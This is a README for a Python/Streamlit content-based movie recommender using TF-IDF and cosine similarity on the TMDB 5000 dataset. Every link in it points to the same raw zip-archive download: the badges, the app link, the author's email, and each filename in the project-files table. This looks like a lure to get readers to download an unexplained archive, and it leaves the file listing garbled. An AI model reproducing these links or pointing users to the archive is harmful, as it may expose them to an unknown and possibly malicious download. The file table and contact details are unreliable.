## 🎬 Movie Recommendation System (Content-Based)

[![Python](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)  
[![Streamlit](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)  

A content-based movie recommendation system built with **Python** and **machine learning techniques**.  
It suggests movies similar to the one a user likes based on features like **genres, keywords, tagline, cast, and director**.

---

## ⚙️ Tech Stack
- **Python 🐍**  
- **Pandas / NumPy** – Data handling  
- **Scikit-learn** – TF-IDF Vectorizer + Cosine Similarity  
- **Difflib** – Fuzzy title matching  
- **Streamlit** – Interactive web app  

---

## 🚀 How It Works
1. Combines key movie features into a single string for each movie.  
2. Converts features into numerical vectors using **TF-IDF Vectorizer**.  
3. Computes **cosine similarity** between movies.  
4. Returns the **top 10 most similar movies** to the user-provided movie.  

---

## 💡 Example
**Input:** Enter your favourite movie name: `Iron Man`  

**Output:** Movies suggested for you:  
1. Iron Man  
2. Iron Man 2  
3. Iron Man 3  
4. The Avengers  
5. Avengers: Age of Ultron  
6. Ant-Man  
7. Captain America: Civil War  
8. Captain America: The Winter Soldier  
9. X-Men  
10. Made  

---

## 🧠 Error Handling
If a movie title entered by the user isn’t found in the dataset, the system shows:  
❌ Sorry, that movie is not in our database. Please try another one.

---

## 🌐 Deployment
- **Streamlit Cloud:** [Click here to try the app](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)  
- **Heroku:** Deployed using `Procfile` and `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` (instructions in repo)  

---

## 📂 Dataset
Uses the **TMDB 5000 Movies Dataset** with metadata including:  
- Movie titles  
- Genres  
- Keywords  
- Tagline  
- Cast  
- Director  

---

## 🧩 Project Files

| File | Description |
|------|-------------|
| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Main Jupyter Notebook with model code |
| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Streamlit app for deployment |
| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Saved model (vectorizer + dataset) |
| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Movie metadata dataset |
| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Python dependencies |
| `Procfile` & `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Heroku deployment files |
| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Project documentation |

---

## 💡 Future Improvements
- Add a fully interactive **Streamlit web app**  
- Combine with user ratings for a **hybrid recommendation system**  
- Deploy online (e.g., **Render**, **HuggingFace**, or **Streamlit Cloud**)  

---

## 👨‍💻 Author
**Emmanuel Ogunkoya**  
📧 https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip

Built as a fun machine learning project to explore **recommender systems**.  

⭐ Don’t forget to star this repo if you like it!
